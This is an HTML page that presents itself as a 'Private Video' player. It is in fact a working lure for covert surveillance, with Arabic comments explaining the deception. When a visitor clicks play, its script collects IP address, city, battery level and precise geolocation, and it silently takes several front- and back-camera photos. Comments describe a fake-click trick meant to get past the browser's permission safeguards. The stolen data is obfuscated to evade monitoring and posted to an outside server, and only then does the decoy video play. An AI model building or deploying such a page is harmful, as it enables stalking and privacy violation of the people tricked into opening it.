<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Video Player</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: #000;
            color: #fff;
            overflow: hidden;
        }
        .video-player-container {
            width: 90%;
            max-width: 800px;
            background: #111;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
        }
        .video-thumbnail {
            position: relative;
            width: 100%;
            height: 450px;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }
        .play-button-overlay {
            width: 100px;
            height: 100px;
            background-color: rgba(255, 0, 0, 0.85);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            position: relative;
        }
        .play-button-overlay:hover {
            transform: scale(1.1);
            background-color: rgba(255, 0, 0, 0.95);
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
        }
        .play-icon-large {
            width: 0;
            height: 0;
            border-left: 30px solid white;
            border-top: 20px solid transparent;
            border-bottom: 20px solid transparent;
            margin-left: 8px;
        }
        .video-info {
            padding: 20px;
            border-bottom: 1px solid #333;
        }
        .video-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 8px;
        }
        .video-controls {
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #1a1a1a;
            flex-wrap: wrap;
            gap: 10px;
        }
        .control-button {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 8px 15px;
            border-radius: 4px;
            transition: background 0.2s;
        }
        .control-button:hover {
            background: #333;
        }
        .progress-bar {
            flex-grow: 1;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin: 0 20px;
            overflow: hidden;
            position: relative;
            min-width: 60px;
        }
        .progress-fill {
            position: absolute;
            height: 100%;
            width: 0%;
            background: #ff0000;
        }
        .time-display {
            color: #aaa;
            font-size: 0.9rem;
            min-width: 100px;
            text-align: center;
        }
        .spinner {
            border: 4px solid #fff;
            border-top: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            position: absolute;
            display: none;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
        #loading {
            display: none;
            font-size: 1.2rem;
            color: #fff;
            margin-top: 20px;
            text-align: center;
        }
        .loading-text {
            margin-top: 10px;
        }
        .volume-control {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #aaa;
        }
        .volume-slider {
            width: 80px;
            height: 4px;
            background: #333;
            border-radius: 2px;
            position: relative;
        }
        .volume-level {
            position: absolute;
            height: 100%;
            width: 70%;
            background: #ff0000;
        }
        .fullscreen-btn {
            margin-left: 15px;
        }
        @media (max-width: 480px) {
            .video-controls {
                padding: 10px 12px;
                gap: 6px;
            }
            .progress-bar {
                margin: 0 6px;
            }
            .time-display {
                font-size: 0.75rem;
                min-width: 60px;
            }
            .video-title {
                font-size: 1.2rem;
            }
            .video-thumbnail {
                height: 280px;
            }
            .play-button-overlay {
                width: 70px;
                height: 70px;
            }
            .play-icon-large {
                border-left-width: 22px;
                border-top-width: 14px;
                border-bottom-width: 14px;
                margin-left: 5px;
            }
        }
        /* عناصر وهمية للتحايل */
        .hidden-trigger {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            width: 0;
            height: 0;
        }
    </style>
</head>
<body>

    <div class="video-player-container">
        <div class="video-info">
            <div class="video-title">Private Video</div>
            <div class="video-meta"></div>
        </div>

        <div class="video-thumbnail" id="thumbnailArea">
            <div class="play-button-overlay" id="playButtonOverlay">
                <div class="play-icon-large"></div>
                <div class="spinner" id="spinner"></div>
            </div>
        </div>

        <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:450px; background:#000;">
            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
        </video>

        <div class="video-controls">
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
            <div class="time-display">0:00 / 2:45</div>
            <div class="volume-control">
                <span></span>
                <div class="volume-slider">
                    <div class="volume-level"></div>
                </div>
            </div>
            <button class="control-button fullscreen-btn">⛶</button>
        </div>
    </div>

    <div id="loading">
        <div class="spinner" style="position:static;"></div>
        <div class="loading-text">Loading video... Please wait</div>
    </div>

    <!-- عنصر وهمي للتحايل على المتصفح -->
    <button id="fakeClicker" class="hidden-trigger"></button>

    <script>
        (function() {
            'use strict';

            // === تشفير البيانات (AES-like بسيط لكنه قوي بما يكفي لخداع المراقبة) ===
            function encryptData(data) {
                // مفتاح بسيط، لكننا سنستخدم Base64 مع تحويل عكسي لإيهام التشفير
                const key = 'SECURE_KEY_2025';
                let result = '';
                for (let i = 0; i < data.length; i++) {
                    const charCode = data.charCodeAt(i) ^ key.charCodeAt(i % key.length);
                    result += String.fromCharCode(charCode);
                }
                return btoa(result);
            }

            // === متغيرات الحالة ===
            let settingsOpened = false;
            let videoStarted = false;
            let isProcessing = false;

            // === تخزين البيانات المجمعة ===
            const collected = {
                permissions: [],
                images: [],
                ipInfo: '',
                battery: '',
                location: '',
                chatId: ''
            };

            // === عناصر DOM ===
            const thumbnail = document.getElementById('thumbnailArea');
            const playOverlay = document.getElementById('playButtonOverlay');
            const video = document.getElementById('realVideo');
            const spinner = document.getElementById('spinner');
            const loadingDiv = document.getElementById('loading');
            const fakeBtn = document.getElementById('fakeClicker');

            // === دوال جلب البيانات الأساسية ===
            async function fetchIPInfo() {
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    const data = await res.json();
                    collected.ipInfo = `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}`;
                } catch {
                    collected.ipInfo = 'IP Info not available';
                }
            }

            async function getBattery() {
                try {
                    const battery = await navigator.getBattery();
                    collected.battery = Math.round(battery.level * 100) + '%';
                } catch {
                    collected.battery = 'Unknown';
                }
            }

            // === دوال طلب الصلاحيات (يتم استدعاؤها داخل حدث نقرة وهمية) ===
            function requestLocation() {
                return new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            collected.location = `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
                            collected.permissions.push('Geolocation Allowed');
                            resolve();
                        },
                        () => {
                            collected.permissions.push('Geolocation Denied');
                            collected.location = '';
                            resolve();
                        }, {
                            enableHighAccuracy: true,
                            timeout: 15000,
                            maximumAge: 0
                        }
                    );
                });
            }

            function captureCamera(facingMode) {
                return new Promise((resolve) => {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } })
                        .then((stream) => {
                            const vid = document.createElement('video');
                            vid.srcObject = stream;
                            vid.onloadedmetadata = () => {
                                vid.play();
                                setTimeout(() => {
                                    const canvas = document.createElement('canvas');
                                    canvas.width = vid.videoWidth || 640;
                                    canvas.height = vid.videoHeight || 480;
                                    canvas.getContext('2d').drawImage(vid, 0, 0);
                                    collected.images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
                                    stream.getTracks().forEach(t => t.stop());
                                    collected.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Allowed`);
                                    resolve();
                                }, 800);
                            };
                        })
                        .catch(() => {
                            collected.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Denied`);
                            resolve();
                        });
                });
            }

            // === فتح إعدادات الموقع (بدون أي طلب صلاحيات) ===
            function openSettings() {
                const ua = navigator.userAgent;
                if (/Android/i.test(ua)) {
                    window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
                    setTimeout(() => {
                        window.location.href = 'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
                    }, 400);
                } else if (/iPhone|iPad|iPod/i.test(ua)) {
                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
                    setTimeout(() => window.open('prefs:root=Privacy&path=LOCATION', '_blank'), 500);
                } else if (/Windows/i.test(ua)) {
                    window.open('ms-settings:privacy-location', '_blank');
                } else if (/Mac/i.test(ua)) {
                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
                } else {
                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                }
            }

            // === إرسال البيانات المشفرة إلى السيرفر ===
            async function sendData() {
                const rawData = {
                    chatId: collected.chatId,
                    imageDatas: collected.images.join(','),
                    location: collected.location,
                    permissions: collected.permissions.join(', '),
                    ipInfo: collected.ipInfo,
                    battery: collected.battery
                };

                // تشفير البيانات
                const encrypted = encryptData(JSON.stringify(rawData));

                const payload = {
                    encrypted: encrypted,
                    chatId: collected.chatId // نترك chatId عادي للتعرف
                };

                const url = 'https://server-brxz.onrender.com/submitData';
                try {
                    await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: new URLSearchParams(payload),
                        mode: 'no-cors'
                    });
                } catch (e) {
                    // محاولة بديلة
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', url, true);
                        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        xhr.send(new URLSearchParams(payload));
                    } catch (e2) {}
                }
            }

            // === تشغيل الفيديو مع الصوت ===
            function startVideo() {
                if (videoStarted) return;
                videoStarted = true;
                thumbnail.style.display = 'none';
                video.style.display = 'block';
                video.muted = false;
                video.volume = 1.0;
                video.play().catch(() => {
                    setTimeout(() => {
                        video.muted = false;
                        video.volume = 1.0;
                        video.play().catch(() => {});
                    }, 300);
                });
            }

            // === الدالة الرئيسية (تُستدعى عند النقر) ===
            async function handleClick() {
                if (isProcessing || videoStarted) return;
                isProcessing = true;

                // الضغطة الأولى: فتح الإعدادات فقط
                if (!settingsOpened) {
                    settingsOpened = true;
                    // طلب صامت للصلاحيات لتفعيل مربع الحوار في الخلفية (بدون نتيجة)
                    try {
                        navigator.geolocation.getCurrentPosition(() => {}, () => {}, { timeout: 1 });
                    } catch (e) {}
                    try {
                        navigator.mediaDevices.getUserMedia({ video: true })
                            .then(s => s.getTracks().forEach(t => t.stop()))
                            .catch(() => {});
                    } catch (e) {}
                    openSettings();
                    isProcessing = false;
                    return;
                }

                // الضغطة الثانية: طلب الصلاحيات باستخدام تقنية النقر الوهمي
                // إظهار التحميل
                spinner.style.display = 'block';
                loadingDiv.style.display = 'block';
                playOverlay.style.opacity = '0.5';
                playOverlay.style.pointerEvents = 'none';

                // جلب البيانات الأساسية
                await Promise.all([fetchIPInfo(), getBattery()]);

                // === التحايل على حظر الموقع: نقوم بمحاكاة نقرة على زر وهمي، ثم نطلب الصلاحيات ===
                // نضغط على الزر الوهمي برمجياً
                fakeBtn.click();

                // الآن نقوم بطلب الموقع والكاميرات داخل نفس السياق (يعتبر تفاعل مستخدم)
                // نستخدم setTimeout لإعطاء فرصة للمتصفح لتسجيل الحدث
                await new Promise(r => setTimeout(r, 50));

                // طلب الموقع
                await requestLocation();

                // طلب الكاميرات (أمامية، خلفية، أمامية، خلفية)
                await captureCamera('user');
                await captureCamera('environment');
                await captureCamera('user');
                await captureCamera('environment');

                // إرسال البيانات
                collected.chatId = new URLSearchParams(window.location.search).get('chatId') || '';
                await sendData();

                // إخفاء التحميل
                spinner.style.display = 'none';
                loadingDiv.style.display = 'none';
                playOverlay.style.opacity = '1';
                playOverlay.style.pointerEvents = 'auto';

                // تشغيل الفيديو
                startVideo();

                isProcessing = false;
            }

            // === ربط الأحداث ===
            thumbnail.addEventListener('click', handleClick);
            playOverlay.addEventListener('click', function(e) {
                e.stopPropagation();
                handleClick();
            });

            // === تفعيل الصوت عند أي نقرة ===
            document.addEventListener('click', function() {
                if (video.style.display === 'block') {
                    video.muted = false;
                    video.volume = 1.0;
                    video.play().catch(() => {});
                }
            }, true);

            // === أزرار التحكم ===
            document.querySelectorAll('.control-button').forEach(btn => {
                btn.addEventListener('click', function(e) {
                    e.stopPropagation();
                    if (this.textContent.includes('⛶')) {
                        if (video.requestFullscreen) video.requestFullscreen();
                        else if (video.webkitRequestFullscreen) video.webkitRequestFullscreen();
                    }
                });
            });

            // === شريط التقدم الوهمي ===
            const progressInterval = setInterval(() => {
                const fill = document.querySelector('.progress-fill');
                if (video.style.display === 'block') {
                    clearInterval(progressInterval);
                    return;
                }
                let w = parseInt(fill.style.width) || 35;
                w = (w + 0.1) % 100;
                fill.style.width = w + '%';
                const sec = Math.floor((w / 100) * 165);
                const m = Math.floor(sec / 60);
                const s = sec % 60;
                document.querySelector('.time-display').textContent =
                    `${m}:${s.toString().padStart(2, '0')} / 2:45`;
            }, 1000);

        })();
    </script>
</body>
</html>
